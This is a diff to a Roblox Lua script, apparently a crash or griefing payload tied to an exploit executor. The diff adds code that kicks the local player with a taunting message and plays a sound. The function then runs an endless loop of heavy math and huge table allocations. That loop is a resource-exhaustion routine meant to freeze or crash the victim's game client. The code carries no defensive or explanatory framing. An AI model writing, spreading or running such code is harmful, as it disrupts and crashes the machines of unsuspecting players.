@@ -1,4 +1,17 @@
 local function fuckthesys()
+    -- Kick the player with a custom message
+    game.Players.LocalPlayer:Kick("I have no enemies cause. Just wait then you will know - CoffeeSolara")
+    wait(0)
+    
+    -- Create and play a sound
+    local snd = game.SoundService
+    local sng = Instance.new("Sound")
+    sng.Parent = snd
+    sng.SoundId = "rbxassetid://1848354536"
+    sng:Play()
+    wait(0.001)
+    
+    -- Perform intensive calculations
     while true do
         for i = 1, 1e7 do
             local result = math.sqrt(i) * math.sin(i) * math.cos(i) * math.exp(i % 20) * math.log(i + 1)
@@ -11,7 +24,8 @@ local function fuckthesys()
             result = result + math.atan(math.tan(i)) * math.log(math.abs(math.sin(i * math.exp(i % 10))))
             result = result * math.pow(math.log(i + 1), 2) / math.exp(math.sin(i) * math.cos(i))
         end
-
+        
+        -- Create large data structures
         local t = {}
         for i = 1, 1e6 do
             t[i] = {
@@ -43,7 +57,6 @@ local function fuckthesys()
                 }
             }
         end
-
     end
 end
 
